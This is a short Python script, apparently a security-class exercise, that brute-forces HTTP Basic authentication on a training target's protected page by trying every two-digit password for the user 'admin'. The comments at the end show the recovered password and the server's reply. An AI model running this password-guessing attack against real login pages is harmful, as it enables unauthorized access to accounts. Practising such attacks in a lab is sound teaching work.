

# Make a Python script that logs in to this page:
# http://target1.bowneconsulting.com/protected/A2.4
# with these parameters:
# Username: admin
# Password: a two-digit number
# User-Agent: python

import socket
import base64

# Input
host = 'target1.bowneconsulting.com'
port = 80
url = '/protected/A2.4'
username = 'admin'
agent = 'python'

for password in range(99, 0, -1):
    pwd = str(password).rjust(2, '0')
    cred = f"{username}:{pwd}"
    print(f"Trying {cred}")
    auth = base64.b64encode(cred.encode())
    s = socket.socket()
    s.settimeout(2)
    s.connect((host, port))

    # Build request based on requirements above
    req = f"""GET {url} HTTP/1.1\r
User-Agent: {agent}\r
Authorization: Basic {auth.decode()}\r
Host: {host}\r
\r
"""
    s.send(req.encode())
    reply = s.recv(1024).decode()
    if 'Unauthorized' not in reply:
        print(f"{username} password is '{pwd}'")
        print(reply)
        break
    s.close()

#   Admin password is '91'
# HTTP/1.1 301 Moved Permanently
# Date: Wed, 02 Nov 2022 23:59:16 GMT
# Server: Apache/2.4.29 (Ubuntu)
# Location: http://target1.bowneconsulting.com/protected/A2.4/
# Content-Length: 351
# Content-Type: text/html; charset=iso-8859-1
#
# <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
# <html><head>
# <title>301 Moved Permanently</title>
# </head><body>
# <h1>Moved Permanently</h1>
# <p>The document has moved <a href="http://target1.bowneconsulting.com/protected/A2.4/">here</a>.</p>
# <hr>
# <address>Apache/2.4.29 (Ubuntu) Server at target1.bowneconsulting.com Port 80</address>
# </body></html>
